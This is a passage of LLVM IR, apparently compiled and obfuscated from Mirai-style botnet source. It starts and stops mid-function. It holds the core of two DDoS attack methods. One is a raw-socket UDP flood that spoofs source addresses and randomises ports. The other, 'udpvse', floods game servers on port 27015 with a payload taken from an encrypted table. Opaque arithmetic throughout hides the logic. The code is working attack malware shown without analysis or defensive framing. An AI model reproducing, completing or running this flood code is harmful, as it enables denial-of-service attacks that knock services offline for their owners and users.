  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %360

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #6
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %360

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %201, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %207

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = xor i8 15, -1
  %109 = xor i8 %107, %108
  %110 = and i8 %109, %107
  %111 = and i8 %107, 15
  %112 = and i8 %110, 64
  %113 = xor i8 %110, 64
  %114 = or i8 %112, %113
  %115 = or i8 %110, 64
  store i8 %114, i8* %106, align 4
  %116 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %117 = bitcast %struct.iphdr* %116 to i8*
  %118 = load i8, i8* %117, align 4
  %119 = xor i8 %118, -1
  %120 = xor i8 -16, -1
  %121 = xor i8 49, -1
  %122 = or i8 %119, %120
  %123 = or i8 49, %121
  %124 = xor i8 %122, -1
  %125 = and i8 %124, %123
  %126 = and i8 %118, -16
  %127 = xor i8 %125, -1
  %128 = xor i8 5, -1
  %129 = xor i8 64, -1
  %130 = and i8 %127, 64
  %131 = and i8 %125, %129
  %132 = and i8 %128, 64
  %133 = and i8 5, %129
  %134 = or i8 %130, %131
  %135 = or i8 %132, %133
  %136 = xor i8 %134, %135
  %137 = or i8 %127, %128
  %138 = xor i8 %137, -1
  %139 = or i8 64, %129
  %140 = and i8 %138, %139
  %141 = or i8 %136, %140
  %142 = or i8 %125, 5
  store i8 %141, i8* %117, align 4
  %143 = load i8, i8* %12, align 1
  %144 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 1
  store i8 %143, i8* %145, align 1
  %146 = load i16, i16* %18, align 2
  %147 = zext i16 %146 to i64
  %148 = sub i64 28, -6179167498045163188
  %149 = add i64 %148, %147
  %150 = add i64 %149, -6179167498045163188
  %151 = add i64 28, %147
  %152 = trunc i64 %150 to i16
  %153 = call zeroext i16 @htons(i16 zeroext %152) #7
  %154 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 2
  store i16 %153, i16* %155, align 2
  %156 = load i16, i16* %13, align 2
  %157 = call zeroext i16 @htons(i16 zeroext %156) #7
  %158 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 3
  store i16 %157, i16* %159, align 4
  %160 = load i8, i8* %14, align 1
  %161 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 5
  store i8 %160, i8* %162, align 4
  %163 = load i8, i8* %15, align 1
  %164 = icmp ne i8 %163, 0
  br i1 %164, label %165, label %169

; <label>:165:                                    ; preds = %90
  %166 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %167 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 4
  store i16 %166, i16* %168, align 2
  br label %169

; <label>:169:                                    ; preds = %165, %90
  %170 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 6
  store i8 17, i8* %171, align 1
  %172 = load i32, i32* %20, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 8
  store i32 %172, i32* %174, align 4
  %175 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %176 = load i32, i32* %9, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i64 %177
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i32 0, i32 1
  %180 = load i32, i32* %179, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 9
  store i32 %180, i32* %182, align 4
  %183 = load i16, i16* %16, align 2
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %186 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %185, i32 0, i32 0
  store i16 %184, i16* %186, align 2
  %187 = load i16, i16* %17, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 1
  store i16 %188, i16* %190, align 2
  %191 = load i16, i16* %18, align 2
  %192 = zext i16 %191 to i64
  %193 = sub i64 8, -7317502972028476212
  %194 = add i64 %193, %192
  %195 = add i64 %194, -7317502972028476212
  %196 = add i64 8, %192
  %197 = trunc i64 %195 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %200 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  br label %201

; <label>:201:                                    ; preds = %169
  %202 = load i32, i32* %9, align 4
  %203 = add i32 %202, -995294750
  %204 = add i32 %203, 1
  %205 = sub i32 %204, -995294750
  %206 = add nsw i32 %202, 1
  store i32 %205, i32* %9, align 4
  br label %85

; <label>:207:                                    ; preds = %85
  br label %208

; <label>:208:                                    ; preds = %359, %207
  store i32 0, i32* %9, align 4
  br label %209

; <label>:209:                                    ; preds = %353, %208
  %210 = load i32, i32* %9, align 4
  %211 = load i8, i8* %5, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp slt i32 %210, %212
  br i1 %213, label %214, label %359

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %11, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds i8*, i8** %215, i64 %217
  %219 = load i8*, i8** %218, align 8
  store i8* %219, i8** %23, align 8
  %220 = load i8*, i8** %23, align 8
  %221 = bitcast i8* %220 to %struct.iphdr*
  store %struct.iphdr* %221, %struct.iphdr** %24, align 8
  %222 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i64 1
  %224 = bitcast %struct.iphdr* %223 to %struct.udphdr*
  store %struct.udphdr* %224, %struct.udphdr** %25, align 8
  %225 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %226 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %225, i64 1
  %227 = bitcast %struct.udphdr* %226 to i8*
  store i8* %227, i8** %26, align 8
  %228 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %229 = load i32, i32* %9, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %228, i64 %230
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i32 0, i32 2
  %233 = load i8, i8* %232, align 4
  %234 = zext i8 %233 to i32
  %235 = icmp slt i32 %234, 32
  br i1 %235, label %236, label %260

; <label>:236:                                    ; preds = %214
  %237 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %238 = load i32, i32* %9, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %237, i64 %239
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i32 0, i32 1
  %242 = load i32, i32* %241, align 4
  %243 = call i32 @ntohl(i32 %242) #7
  %244 = call i32 @rand_next()
  %245 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %246 = load i32, i32* %9, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %245, i64 %247
  %249 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i32 0, i32 2
  %250 = load i8, i8* %249, align 4
  %251 = zext i8 %250 to i32
  %252 = lshr i32 %244, %251
  %253 = sub i32 %243, -1415594182
  %254 = add i32 %253, %252
  %255 = add i32 %254, -1415594182
  %256 = add i32 %243, %252
  %257 = call i32 @htonl(i32 %255) #7
  %258 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 9
  store i32 %257, i32* %259, align 4
  br label %260

; <label>:260:                                    ; preds = %236, %214
  %261 = load i32, i32* %20, align 4
  %262 = icmp eq i32 %261, -1
  br i1 %262, label %263, label %267

; <label>:263:                                    ; preds = %260
  %264 = call i32 @rand_next()
  %265 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 8
  store i32 %264, i32* %266, align 4
  br label %267

; <label>:267:                                    ; preds = %263, %260
  %268 = load i16, i16* %13, align 2
  %269 = zext i16 %268 to i32
  %270 = icmp eq i32 %269, 65535
  br i1 %270, label %271, label %276

; <label>:271:                                    ; preds = %267
  %272 = call i32 @rand_next()
  %273 = trunc i32 %272 to i16
  %274 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 3
  store i16 %273, i16* %275, align 4
  br label %276

; <label>:276:                                    ; preds = %271, %267
  %277 = load i16, i16* %16, align 2
  %278 = zext i16 %277 to i32
  %279 = icmp eq i32 %278, 65535
  br i1 %279, label %280, label %285

; <label>:280:                                    ; preds = %276
  %281 = call i32 @rand_next()
  %282 = trunc i32 %281 to i16
  %283 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %284 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %283, i32 0, i32 0
  store i16 %282, i16* %284, align 2
  br label %285

; <label>:285:                                    ; preds = %280, %276
  %286 = load i16, i16* %17, align 2
  %287 = zext i16 %286 to i32
  %288 = icmp eq i32 %287, 65535
  br i1 %288, label %289, label %294

; <label>:289:                                    ; preds = %285
  %290 = call i32 @rand_next()
  %291 = trunc i32 %290 to i16
  %292 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %293 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %292, i32 0, i32 1
  store i16 %291, i16* %293, align 2
  br label %294

; <label>:294:                                    ; preds = %289, %285
  %295 = load i8, i8* %19, align 1
  %296 = icmp ne i8 %295, 0
  br i1 %296, label %297, label %301

; <label>:297:                                    ; preds = %294
  %298 = load i8*, i8** %26, align 8
  %299 = load i16, i16* %18, align 2
  %300 = zext i16 %299 to i32
  call void @rand_str(i8* %298, i32 %300)
  br label %301

; <label>:301:                                    ; preds = %297, %294
  %302 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 7
  store i16 0, i16* %303, align 2
  %304 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %305 = bitcast %struct.iphdr* %304 to i16*
  %306 = call zeroext i16 @checksum_generic(i16* %305, i32 20)
  %307 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 7
  store i16 %306, i16* %308, align 2
  %309 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %310 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %309, i32 0, i32 3
  store i16 0, i16* %310, align 2
  %311 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %312 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %313 = bitcast %struct.udphdr* %312 to i8*
  %314 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 2
  %316 = load i16, i16* %315, align 2
  %317 = load i16, i16* %18, align 2
  %318 = zext i16 %317 to i64
  %319 = sub i64 0, %318
  %320 = sub i64 8, %319
  %321 = add i64 8, %318
  %322 = trunc i64 %320 to i32
  %323 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %311, i8* %313, i16 zeroext %316, i32 %322)
  %324 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 3
  store i16 %323, i16* %325, align 2
  %326 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %327 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %326, i32 0, i32 1
  %328 = load i16, i16* %327, align 2
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 0
  %334 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %333, i32 0, i32 1
  store i16 %328, i16* %334, align 2
  %335 = load i32, i32* %10, align 4
  %336 = load i8*, i8** %23, align 8
  %337 = load i16, i16* %18, align 2
  %338 = zext i16 %337 to i64
  %339 = add i64 28, 85290936457749933
  %340 = add i64 %339, %338
  %341 = sub i64 %340, 85290936457749933
  %342 = add i64 28, %338
  %343 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %344 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i32 0, i32 0
  %349 = bitcast %struct.sockaddr_in* %348 to %struct.sockaddr*
  store %struct.sockaddr* %349, %struct.sockaddr** %343, align 8
  %350 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %351 = load %struct.sockaddr*, %struct.sockaddr** %350, align 8
  %352 = call i64 @sendto(i32 %335, i8* %336, i64 %341, i32 16384, %struct.sockaddr* %351, i32 16)
  br label %353

; <label>:353:                                    ; preds = %301
  %354 = load i32, i32* %9, align 4
  %355 = sub i32 %354, 2010627756
  %356 = add i32 %355, 1
  %357 = add i32 %356, 2010627756
  %358 = add nsw i32 %354, 1
  store i32 %357, i32* %9, align 4
  br label %209

; <label>:359:                                    ; preds = %209
  br label %208

; <label>:360:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %321

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %321

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %178, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %184

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = xor i8 15, -1
  %95 = xor i8 %93, %94
  %96 = and i8 %95, %93
  %97 = and i8 %93, 15
  %98 = and i8 %96, 64
  %99 = xor i8 %96, 64
  %100 = or i8 %98, %99
  %101 = or i8 %96, 64
  store i8 %100, i8* %92, align 4
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = bitcast %struct.iphdr* %102 to i8*
  %104 = load i8, i8* %103, align 4
  %105 = xor i8 -16, -1
  %106 = xor i8 %104, %105
  %107 = and i8 %106, %104
  %108 = and i8 %104, -16
  %109 = and i8 %107, 5
  %110 = xor i8 %107, 5
  %111 = or i8 %109, %110
  %112 = or i8 %107, 5
  store i8 %111, i8* %103, align 4
  %113 = load i8, i8* %12, align 1
  %114 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 1
  store i8 %113, i8* %115, align 1
  %116 = load i32, i32* %19, align 4
  %117 = sext i32 %116 to i64
  %118 = add i64 32, -3190796451979875157
  %119 = add i64 %118, %117
  %120 = sub i64 %119, -3190796451979875157
  %121 = add i64 32, %117
  %122 = trunc i64 %120 to i16
  %123 = call zeroext i16 @htons(i16 zeroext %122) #7
  %124 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 2
  store i16 %123, i16* %125, align 2
  %126 = load i16, i16* %13, align 2
  %127 = call zeroext i16 @htons(i16 zeroext %126) #7
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 3
  store i16 %127, i16* %129, align 4
  %130 = load i8, i8* %14, align 1
  %131 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 5
  store i8 %130, i8* %132, align 4
  %133 = load i8, i8* %15, align 1
  %134 = icmp ne i8 %133, 0
  br i1 %134, label %135, label %139

; <label>:135:                                    ; preds = %73
  %136 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %137 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i32 0, i32 4
  store i16 %136, i16* %138, align 2
  br label %139

; <label>:139:                                    ; preds = %135, %73
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 6
  store i8 17, i8* %141, align 1
  %142 = load i32, i32* @LOCAL_ADDR, align 4
  %143 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 8
  store i32 %142, i32* %144, align 4
  %145 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %146 = load i32, i32* %9, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i64 %147
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i32 0, i32 1
  %150 = load i32, i32* %149, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 9
  store i32 %150, i32* %152, align 4
  %153 = load i16, i16* %16, align 2
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 0
  store i16 %154, i16* %156, align 2
  %157 = load i16, i16* %17, align 2
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 1
  store i16 %158, i16* %160, align 2
  %161 = load i32, i32* %19, align 4
  %162 = sext i32 %161 to i64
  %163 = sub i64 12, -6398029046659410668
  %164 = add i64 %163, %162
  %165 = add i64 %164, -6398029046659410668
  %166 = add i64 12, %162
  %167 = trunc i64 %165 to i16
  %168 = call zeroext i16 @htons(i16 zeroext %167) #7
  %169 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %170 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %169, i32 0, i32 2
  store i16 %168, i16* %170, align 2
  %171 = load i8*, i8** %22, align 8
  %172 = bitcast i8* %171 to i32*
  store i32 -1, i32* %172, align 4
  %173 = load i8*, i8** %22, align 8
  %174 = getelementptr inbounds i8, i8* %173, i64 4
  store i8* %174, i8** %22, align 8
  %175 = load i8*, i8** %22, align 8
  %176 = load i8*, i8** %18, align 8
  %177 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %175, i8* %176, i32 %177)
  br label %178

; <label>:178:                                    ; preds = %139
  %179 = load i32, i32* %9, align 4
  %180 = add i32 %179, 1541744302
  %181 = add i32 %180, 1
  %182 = sub i32 %181, 1541744302
